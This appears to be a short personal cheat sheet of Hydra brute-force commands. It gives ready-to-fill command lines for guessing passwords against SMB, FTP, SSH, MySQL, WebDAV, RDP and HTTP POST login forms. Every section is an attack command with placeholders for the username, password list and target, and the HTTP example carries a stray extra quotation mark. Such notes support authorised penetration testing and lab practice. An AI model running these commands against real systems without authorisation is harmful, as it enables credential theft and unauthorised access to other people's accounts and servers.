#tools/bruteforce/hydra 
*-l/L or -p/P can be used based on requirement*

## SMB
```
hydra -l <username> -P <password_list> <ip_address> smb
```

## FTP
```
hydra -l <username> -P <password_list> <ip_address> ftp
```

## SSH
```
hydra -l <username> -P <password_list> <ip_address> ssh
```

## MySQL
```
hydra -l <username> -P <password_list> <ip_address> mysql
```

## WebDAV
```
hydra -l <username> -P <password_list> <ip_address> http-get /webdav/
```

## RDP
```
hydra -l <username> -P <password_list> rdp://<ip_address> -s <custom_port>
```

## HTTP
```
hydra -l <uname> -P <pass_list> http://<target>/<path> http-post-form "/<loginpage>/php:login=^USER^&password=^PASS^&.....&form=submit:Invalid credentials or user not activated!""
```